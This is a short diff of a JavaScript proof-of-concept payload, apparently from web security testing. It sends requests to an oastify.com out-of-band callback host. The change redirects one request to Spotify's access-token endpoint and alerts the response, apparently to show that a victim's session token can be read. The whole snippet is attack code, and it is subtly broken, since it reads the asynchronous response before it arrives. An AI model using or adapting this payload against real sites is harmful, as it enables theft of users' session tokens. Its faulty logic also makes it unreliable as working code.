@@ -1,9 +1,9 @@
 function makeGetRequest(url) {
     var xhr = new XMLHttpRequest();
     xhr.open("GET", url);
-    alert("Request successful for URL: " + url);
     xhr.send();
+    alert("Source code for URL " + url + ":\n\n" + xhr.responseText);
 }
 makeGetRequest("https://86cunvcnkew7xmguzk23wvuvmmsdga4z.oastify.com");
-makeGetRequest("https://86cunvcnkew7xmguzk23wvuvmmsdga4z.oastify.com/dd");
+makeGetRequest("https://open.spotify.com/get_access_token");
 makeGetRequest("https://86cunvcnkew7xmguzk23wvuvmmsdga4z.oastify.com/azfoiazjf");
